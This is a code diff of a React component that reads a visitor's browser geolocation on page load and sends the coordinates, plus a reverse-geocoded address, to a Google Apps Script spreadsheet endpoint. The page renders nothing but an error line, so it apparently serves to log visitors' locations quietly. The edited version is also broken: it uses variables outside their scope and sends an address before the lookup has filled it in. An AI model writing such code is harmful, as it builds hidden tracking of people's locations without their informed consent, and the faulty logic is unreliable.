@@ -1,15 +1,18 @@
 import React, { useState, useEffect } from "react";
 
-const sendLocationToSheet = async (lat, lng) => {
+const sendLocationToSheet = async (lat, lng, address) => {
   const data = new URLSearchParams();
   data.append("latitude", lat);
   data.append("longitude", lng);
-  data.append("source", "page_load");
+  data.append("address", address);
 
-  await fetch("https://script.google.com/macros/s/AKfycbyy437y39szJ4-oaM5W2eUeVLkpvQbOHDVeOnbAPRGUXYZ_25ibZ13gr2IQ2xgEv9U8/exec", {
-    method: "POST",
-    body: data,
-  });
+  await fetch(
+    "https://script.google.com/macros/s/AKfycbyy437y39szJ4-oaM5W2eUeVLkpvQbOHDVeOnbAPRGUXYZ_25ibZ13gr2IQ2xgEv9U8/exec",
+    {
+      method: "POST",
+      body: data,
+    }
+  );
 };
 
 const GetLocation = () => {
@@ -17,7 +20,7 @@ const GetLocation = () => {
     lat: "",
     lng: "",
   });
-
+  const [address, setAddress] = useState("");
   const [error, setError] = useState("");
   useEffect(() => {
     if (!navigator.geolocation) {
@@ -31,19 +34,21 @@ const GetLocation = () => {
         const lng = position.coords.longitude;
 
         setLocation({ lat, lng });
-
-        // 👉 send to sheet immediately
-        sendLocationToSheet(lat, lng);
       },
       (err) => {
         setError("Location permission denied");
       }
     );
+    fetch(
+      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${location.lat}&lon=${location.lng}`
+    )
+      .then((res) => res.json())
+      .then((data) => {
+        setAddress(data.display_name);
+      });
+    // 👉 send to sheet immediately
+    sendLocationToSheet(lat, lng, address);
   }, []);
-  return (
-    <div>
-      {error && <p>{error}</p>}
-    </div>
-  );
+  return <div>{error && <p>{error}</p>}</div>;
 };
 export default GetLocation;
